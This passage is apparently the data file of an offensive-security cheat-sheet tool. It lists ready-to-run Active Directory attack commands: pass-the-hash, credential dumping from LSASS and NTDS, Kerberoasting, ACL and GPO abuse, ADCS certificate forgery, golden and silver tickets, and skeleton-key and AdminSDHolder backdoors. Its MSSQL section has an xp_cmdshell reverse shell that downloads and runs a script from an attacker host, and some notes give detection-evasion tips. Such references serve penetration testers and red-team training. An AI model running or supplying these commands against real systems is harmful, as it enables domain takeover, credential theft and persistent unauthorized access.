              { id: 'adp12', label: 'Step 3 — get service ticket as Administrator', os: 'Linux', command: 'impacket-getST -spn cifs/$$TARGET_HOST.$$DOMAIN -impersonate Administrator -dc-ip $$DC $$DOMAIN/EVIL$:Evil123', notes: 'S4U2Proxy via RBCD. export KRB5CCNAME=Administrator.ccache then use psexec -k -no-pass.' },
            ],
          },
        ],
      },
      {
        id: 'ad-lateral',
        name: 'Lateral Movement & Harvesting',
        description: 'Move to high-value hosts using current credentials. Harvest new credentials at every hop — this sub-loop is the engine of the engagement.',
        tags: ['active-directory', 'lateral-movement', 'kerberos'],
                subtechniques: [
          {
            id: "adlm-pth",
            name: "Pass-the-Hash",
            commands: [
            { id: "adlm1", label: "psexec (PtH)", os: "Linux", command: "impacket-psexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Loud — creates a service + generates event logs. Use only for initial access confirmation." },
            { id: "adlm2", label: "wmiexec (PtH)", os: "Linux", command: "impacket-wmiexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Quieter than psexec — executes via WMI, no service created." },
            { id: "adlm3", label: "smbexec (PtH)", os: "Linux", command: "impacket-smbexec $$DOMAIN/$$USER@$$TARGET_HOST -hashes :$$HASH", notes: "Quiet alternative — no binary dropped, runs via service file shares." },
            { id: "adlm4", label: "evil-winrm (PtH)", os: "Linux", command: "evil-winrm -i $$TARGET_HOST -u $$USER -H $$HASH", notes: "WinRM on port 5985. Cleanest interactive shell for post-exploitation work." },
            { id: "adlm5", label: "xfreerdp (PtH)", os: "Linux", command: "xfreerdp /u:$$USER /pth:$$HASH /v:$$TARGET_HOST /dynamic-resolution", notes: "RDP via pass-the-hash. Requires NLA to be disabled or restricted admin mode enabled." }
            ]
          },
          {
            id: "adlm-ptt",
            name: "Pass-the-Ticket & Spray",
            commands: [
            { id: "adlm6", label: "psexec (Pass-the-Ticket)", os: "Linux", command: "export KRB5CCNAME=$$TICKET && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$TARGET_HOST.$$DOMAIN", notes: "Use FQDN not IP — Kerberos requires hostname resolution." },
            { id: "adlm7", label: "Spray hash across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success", notes: "Find every host where this hash grants local admin — map full reach before moving." },
            { id: "adlm-oph1", label: "Overpass-the-Hash — get TGT (Rubeus)", os: "Windows", command: "Rubeus.exe asktgt /user:$$USER /rc4:$$HASH /ptt", notes: "Converts NTLM hash into a Kerberos TGT. /ptt injects directly into current session. Use /aes256 if available." },
            { id: "adlm-oph2", label: "Overpass-the-Hash — get TGT (impacket)", os: "Linux", command: "impacket-getTGT $$DOMAIN/$$USER -hashes :$$HASH && export KRB5CCNAME=$$USER.ccache", notes: "Linux equivalent. Gets a TGT from the KDC using NTLM hash. Then use with -k -no-pass tools." },
            { id: "adlm-oph3", label: "Overpass-the-Hash — Mimikatz", os: "Windows", command: "mimikatz # sekurlsa::pth /user:$$USER /domain:$$DOMAIN /ntlm:$$HASH /run:powershell.exe", notes: "Spawns new process with Kerberos identity using hash. Less noisy than PTH for SMB signing environments." }
            ]
          },
          {
            id: "adlm-cred",
            name: "Credential Harvesting",
            commands: [
            { id: "adlm8", label: "Dump SAM", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH --sam", notes: "Local account hashes. Built-in Administrator hash often reused across multiple hosts." },
            { id: "adlm9", label: "Dump LSA", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH --lsa", notes: "Service account creds, cached domain logons, DPAPI secrets. High value on servers." },
            { id: "adlm10", label: "Dump LSASS (lsassy)", os: "Linux", command: "nxc smb $$TARGET_HOST -u $$USER -H $$HASH -M lsassy", notes: "Credentials of all users with active sessions — catches DA creds if a session is live." },
            { id: "adlm11", label: "Mimikatz logonpasswords", os: "Windows", command: "mimikatz # sekurlsa::logonpasswords", notes: "Cleartext passwords + hashes from LSASS memory. Requires SeDebugPrivilege / SYSTEM." },
            { id: "adlm12", label: "Mimikatz export tickets", os: "Windows", command: "mimikatz # sekurlsa::tickets /export", notes: "Export Kerberos tickets for pass-the-ticket. Look for DA TGTs in the output." }
            ]
          }
        ],
      },
      {
        id: 'ad-kerberoast-acl',
        name: 'Kerberoasting & ACL Abuse',
        description: 'Attack domain objects via SPN accounts (Kerberoasting) and abusable ACL edges from BloodHound — GenericAll, WriteDACL, ForceChangePassword, GPO write.',
        tags: ['active-directory', 'kerberos', 'acl'],
                subtechniques: [
          {
            id: "adka-kerb",
            name: "Kerberoasting",
            commands: [
            { id: "adka1", label: "Kerberoast — request all TGS", os: "Linux", command: "impacket-GetUserSPNs $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC -request -outputfile kerb.hash", notes: "Request TGS for every SPN account. Prioritize accounts in privileged groups (BloodHound)." },
            { id: "adka2", label: "Crack TGS hash", os: "Linux", command: "hashcat -m 13100 kerb.hash $$WORDLIST", notes: "Mode 13100 = Kerberos TGS-REP (RC4). Add rules for service account naming patterns." }
            ]
          },
          {
            id: "adka-acl",
            name: "ACL Abuse",
            commands: [
            { id: "adka3", label: "ForceChangePassword", os: "Linux", command: "net rpc password \"victim\" \"NewPass123!\" -U \"$$DOMAIN/$$USER%$$PASSWORD\" -S $$DC", notes: "Reset target password without knowing the old one. BloodHound edge: ForceChangePassword." },
            { id: "adka4", label: "Add self to group (GenericAll)", os: "Linux", command: "bloodyAD -d $$DOMAIN -u $$USER -p $$PASSWORD --host $$DC add groupMember \"Target Group\" $$USER", notes: "GenericAll on a group = add yourself directly. Replace \"Target Group\" with the group name from BloodHound." },
            { id: "adka5", label: "Grant DCSync rights (WriteDACL)", os: "Linux", command: "impacket-dacledit -action write -rights DCSync -principal $$USER -target-dn 'DC=corp,DC=local' '$$DOMAIN/$$USER:$$PASSWORD'", notes: "WriteDACL on the domain object = grant yourself replication rights = DCSync. Update the DN for your domain." },
            { id: "adka6", label: "Find writable GPOs", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpo_owners", notes: "Find GPOs where you have write access. Each writable GPO = code exec on all computers it applies to." },
            { id: "adka7", label: "GPO abuse (add local admin)", os: "Linux", command: "pyGPOAbuse $$DOMAIN/$$USER:$$PASSWORD -gpo-id $$GPO_GUID --command \"net localgroup administrators $$USER /add\"", notes: "Modify GPO to execute a command on all computers in scope. Use $$GPO_GUID from gpo_owners output." }
            ]
          }
        ],
      },
      {
        id: 'ad-adcs',
        name: 'ADCS Attacks',
        description: 'Certificate abuse via Certipy (ESC1-ESC16) and Shadow Credentials. Forge certificates as any domain user — often the fastest path to Domain Admin.',
        tags: ['active-directory', 'adcs', 'kerberos'],
        subtechniques: [
          {
            id: 'adcs-enum',
            name: 'Enumeration',
            commands: [
              { id: 'adad1', label: 'Find vulnerable ADCS templates', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Lists CA name and vulnerable templates with ESC classification. Save $$CA_NAME and $$ADCS_TEMPLATE from output.' },
              { id: 'adad-e2', label: 'Find CAs and templates (Windows)', os: 'Windows', command: 'certutil -CA', notes: 'List all CAs. Also: Certify.exe find /vulnerable lists vulnerable templates.' },
            ],
          },
          {
            id: 'adcs-esc1',
            name: 'ESC1 — SAN in CSR',
            commands: [
              { id: 'adad2', label: 'Request cert as DA (ESC1)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'ESC1: template allows Subject Alternative Name (SAN) in CSR. Forge cert as any user including Domain Admin.' },
              { id: 'adad3', label: 'Authenticate with cert → NT hash', os: 'Linux', command: 'certipy auth -pfx administrator.pfx -dc-ip $$DC', notes: 'PKINIT auth with the forged cert. Returns NT hash + TGT of the impersonated account.' },
            ],
          },
          {
            id: 'adcs-esc4',
            name: 'ESC4 — Write Template Permissions',
            commands: [
              { id: 'adad-e4a', label: 'Overwrite template to enable SAN (ESC4)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -save-old -dc-ip $$DC', notes: 'ESC4: WriteOwner/WriteDACL/WriteProperty on template. Overwrites template settings to enable SAN (ESC1 condition).' },
              { id: 'adad-e4b', label: 'Request cert via now-vulnerable template', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'After ESC4 modification the template is now ESC1-vulnerable. Request a DA cert as normal.' },
              { id: 'adad-e4c', label: 'Restore original template (cleanup)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -configuration $$ADCS_TEMPLATE.json -dc-ip $$DC', notes: 'Restore the saved original config to avoid detection.' },
            ],
          },
          {
            id: 'adcs-esc6',
            name: 'ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2',
            commands: [
              { id: 'adad-e6a', label: 'Check CA flag (ESC6)', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout | grep -i EDITF', notes: 'ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — ANY template allows SAN in CSR, not just ESC1 templates.' },
              { id: 'adad-e6b', label: 'Request cert with SAN (any template)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template User -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'With ESC6, the standard User template (or any enroll-allowed template) becomes ESC1-equivalent.' },
            ],
          },
          {
            id: 'adcs-esc8',
            name: 'ESC8 — NTLM Relay to AD CS HTTP',
            commands: [
              { id: 'adad-e8a', label: 'Check for AD CS HTTP endpoint', os: 'Linux', command: 'curl -k http://$$DC/certsrv/', notes: 'ESC8: CA web enrollment (certsrv) accessible over HTTP with NTLM auth — relayable.' },
              { id: 'adad-e8b', label: 'Relay NTLM to AD CS (ESC8)', os: 'Linux', command: 'certipy relay -ca $$CA_NAME -template DomainController -dc $$DC', notes: 'Relay DC machine account auth (triggered via printerbug/petitpotam) to AD CS to get a DC certificate → DCSync.' },
              { id: 'adad-e8c', label: 'Trigger DC authentication (PetitPotam)', os: 'Linux', command: 'python3 PetitPotam.py -u $$USER -p $$PASSWORD $$LHOST $$DC', notes: 'Coerces DC to authenticate to your machine. Combine with relay to AD CS endpoint for domain takeover.' },
            ],
          },
          {
            id: 'adcs-shadow',
            name: 'Shadow Credentials',
            commands: [
              { id: 'adad4', label: 'Shadow Credentials (GenericWrite)', os: 'Linux', command: 'certipy shadow auto -u $$USER@$$DOMAIN -p $$PASSWORD -account $$TARGET_HOST -dc-ip $$DC', notes: 'GenericWrite on computer/user → write msDS-KeyCredentialLink → PKINIT → NT hash. No cert template needed.' },
              { id: 'adad-sc2', label: 'Shadow Credentials (Whisker)', os: 'Windows', command: 'Whisker.exe add /target:$$TARGET_HOST', notes: 'Windows version: adds a key credential to target. Run Rubeus.exe asktgt after to get TGT.' },
            ],
          },
        ],
      },
      {
        id: 'ad-cross-trust',
        name: 'Cross-Trust Attacks',
        description: 'Hop from a child domain to the parent/forest root via SID History injection. Run after owning krbtgt of a child domain.',
        tags: ['active-directory', 'kerberos', 'trust'],
                subtechniques: [
          {
            id: "adct-disc",
            name: "Trust Discovery",
            commands: [
            { id: "adct1", label: "Map domain trusts", os: "Windows", command: "nltest /trusted_domains", notes: "Lists all trusted domains from a domain-joined host." },
            { id: "adct2", label: "Map trusts via LDAP", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation", notes: "Enumerate trust relationships remotely via LDAP." },
            { id: "adct3", label: "BloodHound cross-domain edges", os: "Linux", command: "bloodhound-python -u $$USER -p $$PASSWORD -ns $$DC -d $$DOMAIN -c All --zip", notes: "Enable \"Show Cross-Domain Edges\" in BloodHound. Look for paths to Enterprise Admins." }
            ]
          },
          {
            id: "adct-exp",
            name: "Trust Exploitation",
            commands: [
            { id: "adct4", label: "Dump child krbtgt hash", os: "Linux", command: "impacket-secretsdump $$CHILD_DOMAIN/$$USER:$$PASSWORD@$$DC -just-dc-user krbtgt", notes: "Requires DA in child domain. The child krbtgt hash unlocks the parent forest." },
            { id: "adct5", label: "Child→Parent Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$CHILD_SID -extra-sid $$SID-519 -domain $$CHILD_DOMAIN Administrator", notes: "SID -519 = Enterprise Admins in parent. -extra-sid injects the parent EA SID into the forged ticket." },
            { id: "adct6", label: "Use inter-realm ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Re-enter the loop in the parent domain from Enterprise Admin position." }
            ]
          },
          {
            id: "adct-fgm",
            name: "Foreign Group Membership",
            commands: [
            { id: "adct7", label: "Find foreign group members (BloodHound)", os: "Any", command: "MATCH (u:User)-[:MemberOf]->(g:Group) WHERE u.domain <> g.domain RETURN u.name, g.name, g.domain", notes: "BloodHound raw Cypher. Finds users from one domain that are members of groups in a different domain." },
            { id: "adct8", label: "Find foreign members (PowerView)", os: "Windows", command: "Get-DomainForeignGroupMember -Domain $$DOMAIN", notes: "Enumerates group members from other domains. Foreign admins are a direct cross-trust privilege path." },
            { id: "adct9", label: "Find foreign admins", os: "Windows", command: "Get-DomainForeignUser -Domain $$DOMAIN", notes: "Lists users from the current domain who are in groups in a foreign domain — high value for lateral movement." },
            { id: "adct10", label: "Enumerate with LDAP", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --groups", notes: "Look for group members with SIDs from a different domain (SID prefix won't match current domain SID)." }
            ]
          }
        ],
      },
      {
        id: 'ad-dcsync',
        name: 'DCSync & Persistence',
        description: 'Domain dominance: dump all hashes, forge Golden Tickets that survive password resets, establish persistent access.',
        tags: ['active-directory', 'dcsync', 'persistence', 'kerberos'],
                subtechniques: [
          {
            id: "addc-sync",
            name: "DCSync",
            commands: [
            { id: "addc1", label: "DCSync — all hashes", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc", notes: "Replicates NTDS.dit remotely. Requires DA, EA, or DCSync rights granted via dacledit." },
            { id: "addc2", label: "DCSync — krbtgt only", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc-user krbtgt", notes: "Minimal footprint — pull only the master key needed for Golden Ticket forging." },
            { id: "addc3", label: "DCSync — with hash auth", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC -just-dc -hashes :$$HASH", notes: "Use NTLM hash instead of password — works after pass-the-hash lateral movement." },
            { id: "addc4", label: "Full NTDS.dit dump", os: "Linux", command: "impacket-secretsdump $$DOMAIN/$$USER@$$DC", notes: "SAM + LSA + full NTDS.dit — every domain hash and secret in one shot." }
            ]
          },
          {
            id: "addc-gold",
            name: "Golden Ticket",
            commands: [
            { id: "addc5", label: "Forge Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN Administrator", notes: "Forge a TGT as Administrator using krbtgt hash. Valid 10 years — survives all resets except krbtgt rotation." },
            { id: "addc6", label: "Use Golden Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Rotate krbtgt twice to invalidate — most orgs never do this." }
            ]
          },
          {
            id: "addc-silver",
            name: "Silver Ticket",
            commands: [
            { id: "addc9",  label: "Forge Silver Ticket (Linux)", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN -spn cifs/$$DC.$$DOMAIN Administrator", notes: "Forges a TGS using the target service account hash. No DC contact — works offline. -spn sets target service (cifs/http/mssql/host)." },
            { id: "addc10", label: "Forge Silver Ticket (Mimikatz)", os: "Windows", command: "mimikatz # kerberos::golden /user:Administrator /domain:$$DOMAIN /sid:$$SID /target:$$DC.$$DOMAIN /service:cifs /rc4:$$HASH /ptt", notes: "kerberos::golden with /service makes a Silver Ticket. /ptt injects directly into memory." },
            { id: "addc11", label: "Use Silver Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-smbclient -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Silver Ticket is per-service — change -spn and SPN in smbclient/psexec as needed. No krbtgt contact means no DC log." },
            ]
          },
          {
            id: "addc-skel",
            name: "Skeleton Key",
            commands: [
            { id: "addc12", label: "Inject skeleton key (Mimikatz)", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # misc::skeleton", notes: "Patches LSASS on the DC. Every account now also accepts 'mimikatz' as password. Requires DA on DC. Does not survive DC reboot." },
            { id: "addc13", label: "Remote skeleton key injection", os: "Windows", command: "Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $$DC", notes: "Remote injection via PowerShell Remoting. DC must allow PS Remoting." },
            { id: "addc14", label: "Bypass LSASS protection first", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton", notes: "If RunAsPPL is enabled — use the mimidrv.sys driver (!) to remove protection before injection." },
            { id: "addc15", label: "Authenticate with skeleton password", os: "Any", command: "net use \\\\$$DC\\admin$ /user:$$DOMAIN\\Administrator mimikatz", notes: "Any domain account now also accepts 'mimikatz' as password while skeleton is active." },
            ]
          },
          {
            id: "addc-dsrm",
            name: "DSRM Abuse",
            commands: [
            { id: "addc16", label: "Dump DSRM hash", os: "Windows", command: "mimikatz # token::elevate\nmimikatz # lsadump::sam", notes: "Dumps local SAM on the DC — contains the DSRM Administrator hash. Requires SYSTEM on DC." },
            { id: "addc17", label: "Enable DSRM remote logon", os: "Windows", command: "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD", notes: "Value 2 = DSRM account can log on like a normal local account even when DC is online. Persist this for reuse." },
            { id: "addc18", label: "Pass-the-Hash with DSRM", os: "Windows", command: "mimikatz # sekurlsa::pth /domain:$$DC /user:Administrator /ntlm:$$HASH /run:powershell.exe", notes: "Use DC hostname (not domain) as /domain. DSRM is a LOCAL account — domain must be the machine name." },
            { id: "addc19", label: "Verify registry setting", os: "Windows", command: "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior", notes: "" },
            ]
          },
          {
            id: "addc-pers",
            name: "Persistence Backdoors",
            commands: [
            { id: "addc7", label: "DCSync backdoor (low-priv user)", os: "Linux", command: "impacket-dacledit -action write -rights DCSync -principal $$USER -target-dn 'DC=corp,DC=local' '$$DOMAIN/$$USER:$$PASSWORD'", notes: "Grant a low-priv account replication rights — persists until explicitly revoked. Update DN for your domain." },
            { id: "addc8", label: "AdminSDHolder persistence", os: "Windows", command: "Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=$$DOMAIN\" -PrincipalIdentity $$USER -Rights All", notes: "ACL re-applies to all protected groups every 60 min via SDProp. Extremely stealthy persistent backdoor." }
            ]
          }
        ],
      },
    ],
  },

    /* ── 12. MSSQL ───────────────────────────────────────────────────────────── */
  {
    id: 'mssql',
    name: 'MSSQL',
    icon: '🗃️',
    techniques: [
      {
        id: 'mssql-enum',
        name: 'MSSQL Enumeration',
        description: 'Discover and enumerate MSSQL instances in the domain using PowerUpSQL.',
        tags: ['mssql', 'database', 'active-directory'],
        commands: [
          { id: 'msql1', label: 'Find instances via SPN', os: 'Windows', command: 'Get-SQLInstanceDomain -Verbose', notes: 'PowerUpSQL: finds MSSQL instances via AD SPN query.' },
          { id: 'msql2', label: 'Get server info', os: 'Windows', command: 'Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose', notes: 'Enumerate version, auth type, sysadmin status.' },
          { id: 'msql3', label: 'Check accessibility', os: 'Windows', command: 'Get-SQLInstanceDomain | Get-SQLConnectionTest | ? {$_.Status -eq "Accessible"}', notes: 'Filter to only reachable instances.' },
          { id: 'msql4', label: 'Audit instance', os: 'Windows', command: 'Invoke-SQLAudit -Verbose -Instance $$IP', notes: 'Full PowerUpSQL security audit.' },
        ],
      },
      {
        id: 'mssql-exec',
        name: 'MSSQL Command Execution',
        description: 'Execute OS commands via xp_cmdshell on a SQL Server instance.',
        tags: ['mssql', 'rce', 'xp_cmdshell'],
        commands: [
          { id: 'mex1', label: 'Enable xp_cmdshell', os: 'Windows', command: "Invoke-SQLOSCmd -Instance $$IP -Command \"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\" -Verbose", notes: 'Requires sysadmin role.' },
          { id: 'mex2', label: 'Run OS command', os: 'Windows', command: 'Invoke-SQLOSCmd -Instance $$IP -Command "whoami" -Verbose', notes: 'PowerUpSQL wrapper for xp_cmdshell.' },
          { id: 'mex3', label: 'Raw xp_cmdshell', os: 'Windows', command: "sqlcmd -S $$IP -Q \"EXEC xp_cmdshell 'whoami'\"", notes: 'Direct xp_cmdshell via sqlcmd.' },
          { id: 'mex4', label: 'Reverse shell via xp_cmdshell', os: 'Windows', command: "EXEC xp_cmdshell 'powershell -c \"iex (New-Object Net.WebClient).DownloadString(\\\"http://$$LHOST/shell.ps1\\\")\"'", notes: 'Drop a reverse shell via xp_cmdshell.' },
        ],
      },
      {
        id: 'mssql-linked',
        name: 'Linked Server Crawl',
        description: 'Crawl linked SQL Server instances to pivot across servers and potentially reach higher-privilege instances.',
        tags: ['mssql', 'lateral-movement', 'linked-servers'],
        commands: [
          { id: 'mlnk1', label: 'Find linked servers', os: 'Windows', command: 'Get-SQLServerLinkCrawl -Instance $$IP -Verbose', notes: 'PowerUpSQL: recursively crawls linked servers.' },
          { id: 'mlnk2', label: 'Execute via linked server', os: 'Windows', command: "SELECT * FROM OPENQUERY(\"<linked-server-name>\", 'SELECT system_user')", notes: 'Query across a linked server.' },
          { id: 'mlnk3', label: 'xp_cmdshell via linked server', os: 'Windows', command: "EXECUTE('EXEC xp_cmdshell ''whoami''') AT \"<linked-server-name>\"", notes: 'Run OS command on a linked server.' },
          { id: 'mlnk4', label: 'Cross-forest linked server exec', os: 'Windows', command: 'Get-SQLServerLinkCrawl -Instance $$IP -Query "exec master..xp_cmdshell \'whoami\'"', notes: 'PowerUpSQL crawl with command execution.' },
        ],
      },
    ],
  },

  /* ── 13. Persistence ─────────────────────────────────────────────────────── */
  {
    id: 'persistence',
    name: 'Persistence',
    icon: '🕳️',
    techniques: [
      {
        id: 'pers-skeleton',
        name: 'Skeleton Key',
        description: 'Patch LSASS on the DC to accept a master password for any account without changing real passwords.',
        tags: ['windows', 'active-directory', 'persistence', 'mimikatz'],
        commands: [
          { id: 'sk1', label: 'Inject skeleton key', os: 'Windows', command: 'mimikatz # privilege::debug\nmimikatz # misc::skeleton', notes: 'Requires DA on the DC. Password becomes "mimikatz".' },
          { id: 'sk2', label: 'Invoke-Mimikatz skeleton', os: 'Windows', command: 'Invoke-Mimikatz -Command \'"privilege::debug" "misc::skeleton"\' -ComputerName $$DC', notes: 'Remote injection via PowerShell.' },
          { id: 'sk3', label: 'Handle protected LSASS', os: 'Windows', command: 'mimikatz # privilege::debug\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton', notes: 'Use mimidriv.sys driver (!) to remove RunAsPPL protection first.' },
          { id: 'sk4', label: 'Authenticate with skeleton key', os: 'Any', command: 'net use \\$$DC\admin$ /user:$$DOMAIN\Administrator mimikatz', notes: 'Any account now accepts "mimikatz" as password.' },
        ],
      },
      {
        id: 'pers-dsrm',
        name: 'DSRM (Directory Services Restore Mode)',
        description: 'Abuse the local DSRM admin account on DCs for persistent backdoor access.',
        tags: ['windows', 'active-directory', 'persistence', 'dsrm'],
        commands: [
          { id: 'dsrm1', label: 'Dump DSRM hash (Mimikatz)', os: 'Windows', command: 'mimikatz # token::elevate\nmimikatz # lsadump::sam', notes: 'Local SAM on DC contains the DSRM admin hash.' },
          { id: 'dsrm2', label: 'Set DsrmAdminLogonBehavior (registry)', os: 'Windows', command: 'New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose', notes: 'Value 2 = allow DSRM account to log on like a normal local account.' },
          { id: 'dsrm3', label: 'Pass-the-Hash with DSRM', os: 'Windows', command: 'mimikatz # sekurlsa::pth /domain:$$DC /user:Administrator /ntlm:$$HASH /run:powershell.exe', notes: 'Use DSRM hash with DC computer name (not domain) as domain.' },
          { id: 'dsrm4', label: 'Check/update registry', os: 'Windows', command: 'Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior', notes: '' },
        ],
      },
      {
        id: 'pers-secdesc',
        name: 'Security Descriptors (Remote Access Backdoors)',
        description: 'Modify security descriptors on WMI, PS Remoting, and registry to allow non-admin remote access — RACE toolkit.',
        tags: ['windows', 'active-directory', 'persistence', 'wmi', 'race'],
                subtechniques: [
          {
            id: "sd-set",
            name: "Set Backdoors (RACE)",
            commands: [
            { id: "sd1", label: "Set-RemoteWMI (RACE)", os: "Windows", command: "Set-RemoteWMI -SamAccountName $$USER -ComputerName $$DC -Verbose", notes: "Grants $$USER WMI access to the DC without DA." },
            { id: "sd2", label: "Set-RemotePSRemoting (RACE)", os: "Windows", command: "Set-RemotePSRemoting -SamAccountName $$USER -ComputerName $$DC -Verbose", notes: "Grants $$USER PS Remoting access to the DC." },
            { id: "sd3", label: "Add-RemoteRegBackdoor (DAMP)", os: "Windows", command: "Add-RemoteRegBackdoor -ComputerName $$DC -Trustee $$USER -Verbose", notes: "Grants remote registry read access — allows hash retrieval." }
            ]
          },
          {
            id: "sd-ret",
            name: "Retrieve via DAMP",
            commands: [
            { id: "sd4", label: "Retrieve machine hash (DAMP)", os: "Windows", command: "Get-RemoteMachineAccountHash -ComputerName $$DC -Verbose", notes: "Retrieve DC machine account hash via DAMP backdoor." },
            { id: "sd5", label: "Retrieve local hash (DAMP)", os: "Windows", command: "Get-RemoteLocalAccountHash -ComputerName $$DC -Verbose", notes: "Retrieve local account hashes remotely via DAMP." },
            { id: "sd6", label: "Retrieve cached creds (DAMP)", os: "Windows", command: "Get-RemoteCachedCredential -ComputerName $$DC -Verbose", notes: "Retrieve cached domain credentials via DAMP." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 14. Post-Exploitation ───────────────────────────────────────────────── */
  {
    id: 'post-exploit',
    name: 'Post-Exploitation',
    icon: '🏴',
    techniques: [
      {
        id: 'post-enum-linux',
        name: 'Linux Enumeration',
        description: 'Gather system information after gaining a foothold on a Linux host.',
        tags: ['linux', 'enumeration'],
        commands: [
          { id: 'le1', label: 'System info', os: 'Linux', command: 'uname -a; id; hostname; cat /etc/passwd | grep -v nologin', notes: '' },
          { id: 'le2', label: 'Network info', os: 'Linux', command: 'ip a; ss -tlnp; cat /etc/hosts', notes: '' },
          { id: 'le3', label: 'SUID / capabilities', os: 'Linux', command: 'find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null', notes: '' },
          { id: 'le4', label: 'LinPEAS', os: 'Linux', command: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', notes: 'Comprehensive automated enumeration.' },
        ],
      },
      {
        id: 'post-enum-win',
        name: 'Windows Enumeration',
        description: 'Gather system information after gaining a foothold on a Windows host.',
        tags: ['windows', 'enumeration'],
        commands: [
          { id: 'we1', label: 'System info', os: 'Windows', command: 'systeminfo; whoami /all; net user; net localgroup administrators', notes: '' },
          { id: 'we2', label: 'Network info', os: 'Windows', command: 'ipconfig /all; netstat -ano; arp -a', notes: '' },
          { id: 'we3', label: 'WinPEAS', os: 'Windows', command: 'winPEASany.exe quiet', notes: 'Comprehensive automated enumeration.' },
          { id: 'we4', label: 'PowerUp (AllChecks)', os: 'Windows', command: 'Import-Module PowerUp.ps1; Invoke-AllChecks', notes: 'PowerShell privesc checks.' },
        ],
      },
      {
        id: 'post-transfer',
        name: 'File Transfer',
        description: 'Move tools and loot between attacker and target.',
        tags: ['file-transfer', 'linux', 'windows'],
                subtechniques: [
          {
            id: "ft-dl",
            name: "Download & Serve",
            commands: [
            { id: "ft1", label: "Python HTTP server", os: "Linux", command: "python3 -m http.server 80", notes: "Serve files from current directory." },
            { id: "ft2", label: "Download (Linux wget)", os: "Linux", command: "wget http://$$LHOST/file.sh -O /tmp/file.sh", notes: "" },
            { id: "ft3", label: "Download (PowerShell IWR)", os: "Windows", command: "Invoke-WebRequest -Uri http://$$LHOST/file.exe -OutFile C:Temp\file.exe", notes: "" },
            { id: "ft4", label: "Download (certutil)", os: "Windows", command: "certutil -urlcache -split -f http://$$LHOST/file.exe C:Temp\file.exe", notes: "LOLbin — often allowed." }
            ]
          },
          {
            id: "ft-smb",
            name: "SMB & Remote",
            commands: [
            { id: "ft5", label: "Upload via SCP", os: "Linux", command: "scp file.txt $$USER@$$IP:/tmp/file.txt", notes: "" },
            { id: "ft6", label: "xcopy from share", os: "Windows", command: "xcopy \\$$LHOSTshareTools C:Temp /E /I", notes: "Copy tools from attacker SMB share." }
            ]
          },
          {
            id: "ft-mem",
            name: "In-Memory Execution",
            commands: [
